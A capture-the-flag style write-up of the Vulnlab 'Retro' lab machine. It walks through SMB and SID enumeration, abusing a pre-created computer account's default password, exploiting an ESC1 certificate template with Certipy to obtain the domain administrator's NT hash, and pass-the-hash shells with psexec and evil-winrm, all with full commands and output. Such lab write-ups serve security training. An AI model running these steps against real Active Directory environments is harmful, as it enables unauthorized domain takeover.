---
title: Vulnlab RETRO Machine
date: 2025-10-31 00:00:00 +0000
categories: [WRITUPS, ACTIVE DIRECTORY]
tags: [activedirectory, esc1, sid]
---

# RETRO

IP : `10.10.121.100`

## Network mapping

We start with an nmap scan to see the available services and the possibility of exploiting vulnerabilities.

```bash
# nmap -sV -sC -p- -v -oN nmap_all T4 10.10.91.197
Failed to resolve "T4".
Nmap scan report for 10.10.91.197
Host is up (0.14s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-24 00:34:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-23T23:29:00
| Not valid after:  2026-06-23T23:29:00
| MD5:   d4e9:1ad9:5053:9896:5f57:2a25:4fc6:f9a1
|_SHA-1: 1277:4106:fcce:40d3:ff29:9690:cf3d:893d:6111:899a
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-23T23:29:00
| Not valid after:  2026-06-23T23:29:00
| MD5:   d4e9:1ad9:5053:9896:5f57:2a25:4fc6:f9a1
|_SHA-1: 1277:4106:fcce:40d3:ff29:9690:cf3d:893d:6111:899a
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-23T23:29:00
| Not valid after:  2026-06-23T23:29:00
| MD5:   d4e9:1ad9:5053:9896:5f57:2a25:4fc6:f9a1
|_SHA-1: 1277:4106:fcce:40d3:ff29:9690:cf3d:893d:6111:899a
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-23T23:29:00
| Not valid after:  2026-06-23T23:29:00
| MD5:   d4e9:1ad9:5053:9896:5f57:2a25:4fc6:f9a1
|_SHA-1: 1277:4106:fcce:40d3:ff29:9690:cf3d:893d:6111:899a
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.retro.vl
| Issuer: commonName=DC.retro.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-22T23:37:46
| Not valid after:  2025-12-22T23:37:46
| MD5:   1440:affd:f161:ba24:8498:4764:a301:66ad
|_SHA-1: 465e:38de:5183:65be:a61a:c035:6d15:4481:5f4f:85b4
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-24T00:35:07+00:00
|_ssl-date: 2025-06-24T00:35:47+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
49885/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Enumeration of file sharing

We can see that we are dealing with an Active Directory network. So I started by listing the SMB file shares: Port 88,53,135,139,389

```bash
â””â”€# smbclient -L  \\\\10.10.121.100\\ 

Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Notes           Disk      
        SYSVOL          Disk      Logon server share 
        Trainees        Disk      
Reconnecting with SMB1 for workgroup listing.

```

We see the shares we have access to. Notes, Trainees.
- First, I log into Trainees shares to see if I can find anything interesting.

```bash
â””â”€# smbclient -U '%'  \\\\10.10.121.100\\Trainees 

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 23 17:58:43 2023
  ..                                DHS        0  Wed Jul 26 05:54:14 2023
  Important.txt                       A      288  Sun Jul 23 18:00:13 2023

                6261499 blocks of size 4096. 2223505 blocks available
smb: \> 

```

I download it and try to see what I can find that's interesting.

```bash
â””â”€# cat Important.txt 
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admin
```

- The message gently mocks trainees who constantly forget their passwords.
- The administrator seems **exasperated** by the high number of reset requests.

So I started looking for users available on the network. 
- via rpc did not work
- anonymously via SMB also yielded no results

So I tried brute-forcing SID, which involves enumerating the users and groups of a domain based on their SID (Security Identifier).

## List of users

```bash
â””â”€# impacket-lookupsid 'retro.vl/guest'@retro.vl -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users2.txt
```

### ðŸ” Technical operation :

1. **Connecting to the SMB/RPC service on the target machine** :
    - The script uses **Remote Procedure Call (RPC)** through the port **445 (SMB)** or **135 (RPC endpoint mapper)**.
    - He authenticates himself here with `retro.vl/guest`, without a password (`no-pass`), so in **mode Guest ou anonymement**.
2. **Using the function `LSA_LOOKUP_SIDS` (LSARPC)** :
    - The script queries the **Security Account Manager (SAM)** via `lsarpc` to resolve SIDs (Security Identifiers) to names.
    - It loops on RIDs (Relative Identifiers), generally from 500 to 10,000. :
        - For example, SID `S-1-5-21-XXXXX-XXXXX-XXXXX-500` is often `Administrator`
        - `501` = Guest, etc.

And then I was able to get a few users.

```bash
â””â”€# cat users2.txt 
Administrator
Guest
krbtgt
DC$
trainee
BANKING$
jburley
tblack

```

## Initial Access

After several attempts to obtain a valid ID, we noticed that there is a machine account in the domain.  According to the lab description, this refers to: pre-created computer accounts.
A quick search led us to this blog, which explains in detail: 
[Diving into Pre-Created Computer Accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)


>ðŸ’¡ 
>Recently, I came across an intriguing piece of research published by Oddvar Moe on pre-created computer accounts. Apparently, checking the box Assign this computer account as a computer prior to Windows 2000 changes the computer account password to one that is identical to the computer name.
>This is the case when the computer account was created manually by the administrator and has never been used in the domain. To find such accounts, we look for the UserAccountControl >flag value equal to 4128. Then we can extract a list of computers and try to log in using CrackMapExec. The value of the indicator The error message `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` will indicate that the guessed password for the computer account is correct.We must change the password before we can use the computer account. This can be done with various tools, such as `kpasswd.py` or `rpcchangepwd`.
>py. Note that using Kerberos authentication will exempt you from changing the computer account password. This behavior was discovered by Filip Dragovic


So let's try to reproduce the attacks as described on the blog.

```bash
â””â”€# impacket-smbclient retro.vl/BANKING\$:banking@10.10.121.100                                                           
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc0000199 - STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT - The account used is a computer account. Use your global user account or local user account to access this server.          
```

As mentioned in the blog, we see: `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`, which means that the correct password for a computer account that has not yet been used has been guessed. The same error can also be observed with other tools such as CrackMapExec.

However, if we choose a different password, we get this message: `STATUS_LOGON_FAILURE`

```bash
â”€# impacket-smbclient retro.vl/BANKING\$:banking1234@10.10.121.100
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
```

Before we can use this account, we need to change the password. We cannot change the password via SMB (according to my research). This is because we need to authenticate with the IPC$ share, and our identified computer account cannot be a pre-created computer account whose password has not been changed.

To do this, I used `rpcchangepwd`, which I finally found here. 

[impacket/examples/rpcchangepwd.py at a1d0cc99ff1bd4425eddc1b28add1f269ff230a6 Â· fortra/impacket](https://github.com/fortra/impacket/blob/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py)

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/machines/retro]
â””â”€# python rpcchangepwd.py  retro.vl/banking\$:banking@10.10.80.202 -newpass Liebe123
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Password was changed successfully.
```

We can confirm the effective change of this order with the following order

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/machines/retro]
â””â”€# crackmapexec smb 10.10.80.202 -u 'BANKING$' -p Liebe123       
SMB         10.10.80.202    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.80.202    445    DC               [+] retro.vl\BANKING$:Liebe123
```

Now let's go back to Notes sharing, which we didn't have access to before, but now we have valid credentials.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/machines/retro]
â””â”€# smbclient  -U "BANKING$"  \\\\10.10.80.202\\Notes

Password for [WORKGROUP\BANKING$]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 23 18:03:16 2023
  ..                                DHS        0  Wed Jul 26 05:54:14 2023
  ToDo.txt                            A      248  Sun Jul 23 18:05:56 2023

                6261499 blocks of size 4096. 2222871 blocks available
smb: \> 
```

```bash
â””â”€# cat ToDo.txt                                           
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

But nothing interesting.
I tried an enumeration on Bloodhound.

```bash
bloodhound-python -u 'BANKING$' -p 'Liebe123' -ns 10.10.85.31 -d retro.vl --zip -c all
```

But we didn't find much. Now we've noticed a certificate authority in the nmap scan. 

```bash
**| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA**
```

Let's try to confirm it. I was inspired by this article: [AD Certificate Exploitation: ESC1](https://www.hackingarticles.in/ad-certificate-exploitation-esc1/)

1- Enumeration 

```bash
 certipy-ad find -u 'BANKING$' -p Liebe123 -dc-ip 10.10.80.202 -vulnerable -enabled
```

2- Result

```bash
â””â”€# cat 20250627201422_Certipy.txt                                                    
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Property Principals       : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

We see that there is vulnerability ESC1

>ðŸ’¡ 
>Lâ€™**attaque AD CS ESC1** (Active Directory Certificate Services â€“ *Enterprise Subordinate CA Misconfiguration 1*) est une des failles dâ€™exploitation les plus connues dans les environnements Windows oÃ¹ les services de certificats sont mal configurÃ©s. Elle a Ã©tÃ© documentÃ©e notamment dans les travaux de Will Schroeder et Lee Christensen (SpecterOps).

ðŸ’¡Objective of the ESC1 attack

Allow a **non-privileged user** (or one with limited rights) to **request a certificate** for **any Active Directory user**, including an **account with elevated privileges (such as Domain Admin)**. This certificate can then be used to authenticate via **Kerberos PKINIT**.

---

### ðŸ”§ Prerequisites for ESC1

- A **certificate template** is incorrectly configured with :
    - `ENROLLEE SUPPLIES SUBJECT` : The user requesting the certificate can choose the identity they want. (the field `SubjectAltName` the certificate can be manipulated).
    - `Client Authentication` in uses (EKU = Enhanced Key Usage).
    - Access via *enroll* is authorized for non-privileged users.
    - No restrictions such as `Manager Approval` or `Authorized Signatures`.

So let's try farming 
request a certificate with a `Subject Alternative Name (SAN)` corresponding to a **high-privilege user**, such as `Administrator@domain.local`.

```bash
certipy-ad req -u 'BANKING$' -p 'Liebe123' -dc-ip 10.10.80.202 -ca retro-DC-CA -target 'DC.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
                                                           
```

- **Certificate retrieval**
    
    Une fois approuvÃ© automatiquement, nous  rÃ©cupÃ¨rons un certificat valide.
    
- **Use for Kerberos authentication (PKINIT)**
    
    With this certificate, he can create a **TGT** for the `Administrator` account using PKINIT.
    
    ```
    â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/machines/retro]
    â””â”€# certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.80.202
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Using principal: administrator@retro.vl
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saved credential cache to 'administrator.ccache'
    [*] Trying to retrieve NT hash for 'administrator'
    [*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd036838
    ```
    

Now that we have obtained the administrator's hash, we can log in with psexec.py, which did not work.

```bash
impacket-psexec retro.vl/administrator@retro.vl -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on retro.vl.....
[*] Found writable share ADMIN$
[*] Uploading file ypLEFwak.exe
[*] Opening SVCManager on retro.vl.....
[*] Creating service ejks on retro.vl.....
[*] Starting service ejks.....

```

Let's try with evil-winrm

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Vulnlab/machines/retro]
â””â”€# evil-winrm -i 10.10.80.202 -u 'Administrator'  -H 252fac7066d93dd009d4fd2cd0368389 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

Which ultimately worked.